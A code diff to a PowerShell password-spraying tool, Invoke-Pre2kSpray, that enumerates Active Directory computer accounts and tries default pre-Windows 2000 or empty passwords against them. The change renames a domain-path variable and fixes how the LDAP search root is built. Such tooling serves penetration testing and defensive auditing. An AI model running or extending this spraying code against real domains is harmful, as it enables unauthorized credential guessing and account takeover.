@@ -70,13 +70,13 @@ function Invoke-Pre2kSpray
             # Using domain specified with -Domain option
             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
             $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
-            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
+            $DomainPath = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
         }
         else
         {
             # Trying to use the current user's domain
             $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
+            $DomainPath = "LDAP://" + ([ADSI]"").distinguishedName
             $Domain = $DomainObject.Name
         }
     }
@@ -86,7 +86,7 @@ function Invoke-Pre2kSpray
         break
     }
 
-    Write-Host "[*] Using domain" $CurrentDomain
+    Write-Host "[*] Using domain" $DomainPath
 
     $ComputerListArray = Get-DomainComputerList -Domain $Domain -FilterByPwdLastSet $Filter
 
@@ -117,11 +117,11 @@ function Invoke-Pre2kSpray
 
     if ($NoPass) 
     {
-        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain -NoPass
+        Invoke-SpraySinglePassword -Domain $DomainPath -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain -NoPass
     }
     else
     {
-        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain 
+        Invoke-SpraySinglePassword -Domain $DomainPath -UserListArray $ComputerListArray -OutFile $OutFile -DomainFQDN $Domain 
     }
     
     Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
@@ -150,13 +150,13 @@ function Get-DomainComputerList
             # Using domain specified with -Domain option
             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
             $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
-            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
+            $DomainPath = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
         }
         else
         {
             # Trying to use the current user's domain
             $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
+            $DomainPath = "LDAP://" + ([ADSI]"").distinguishedName
         }
     }
     catch
@@ -172,8 +172,8 @@ function Get-DomainComputerList
     # locking out any accounts.
     Write-Host -ForegroundColor "yellow" "[*] Now creating a list of computers to spray..."
     
-    $ComputerSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
-    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
+    $ComputerSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$DomainPath)
+    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry($DomainPath)
     $ComputerSearcher.SearchRoot = $DirEntry
 
     $ComputerSearcher.filter = "(&(objectClass=computer))"
